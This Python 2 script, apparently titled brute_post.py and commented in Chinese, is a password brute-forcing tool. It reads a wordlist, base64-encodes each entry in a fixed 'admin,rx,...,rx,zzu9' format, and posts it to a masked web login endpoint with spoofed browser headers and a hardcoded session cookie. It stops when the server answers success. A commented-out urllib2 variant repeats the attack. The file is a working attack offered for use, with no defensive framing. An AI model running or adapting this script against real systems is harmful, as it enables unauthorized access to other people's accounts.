#!/usr/bin/env python    
#-*- coding:utf8 -*-

import urllib
import urllib2
import base64
import time
import sys
import requests
import getopt

postdatas = []
dict_file = ""
postdata = ""


def usage():
	print "python brute_post.py -f dict.txt"
	sys.exit(0)

#从字典中读取密码
def get_password(dict_file):
	password = ""
	with open(dict_file,"r") as passwords:
		for password in passwords.readlines():
			password = password.strip()
			password = password.strip("\n")
			password = "admin,rx,"+password+",rx,zzu9"
			password = base64.b64encode(password)
			#password = urllib.quote(password)
			#print "password======="+password
			post_data = {"KEYDATA":password,"tm":"1521861909152"}
			#postdatas.append(post_data)
			url_post_data = urllib.urlencode(post_data)
			postdatas.append(url_post_data)
	return postdatas

#requests发包
def request_post(dict_file):
	requrl = "http://**.**.**.**/login_login"
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0","Accept":"application/json, text/javascript, */*; q=0.01","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate","Referer":"http://xxxxxxx/home","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest","Cookie":"UM_distinctid=161f5bced55a-0fab4a18ad04bc8-495960-fa000-161f5bced56402; JSESSIONID=588806F30644515E63F83C6EBB223CB4","Connection":"keep-alive"}
	postdatas = get_password(dict_file)
	for postdata in postdatas:
		response = requests.post(requrl, data = postdata, headers = headers)
		#print postdata
		#print response.content
		if response.content == '{"result":"success"}':
			print "right password is :",postdata
			sys.exit(0)

'''
#urllib2发包
def post_password():
	requrl = "http://xxxxxx/login_login"
	postdatas = get_password("top1000.txt")
	for postdata in postdatas:
		time.sleep(2)
		print postdata
        req = urllib2.Request(url = requrl,data = postdata)
        print req
        res = urllib2.urlopen(req)
        res_data = res.read()
        print res_data
        if res_data == '{"result":"success"}':
        	print urllib.unquote(base64.b64decode(postdata))
        	sys.exit(0)
        print res_data

post_password()
'''

def main():
	global dict_file

	try:
		opts,args = getopt.getopt(sys.argv[1:],"hf:",["help","dictfile"])
	except getopt.GetoptError as err:
		print str(err)
		sys.exit(0)
	for o,a in opts:
		if o in ("-h","--help"):
			usage()
		elif o in ("-f","--dictfile"):
			dict_file = a
		else:
			assert False,"Unhandled Option"

	request_post(dict_file)

main()
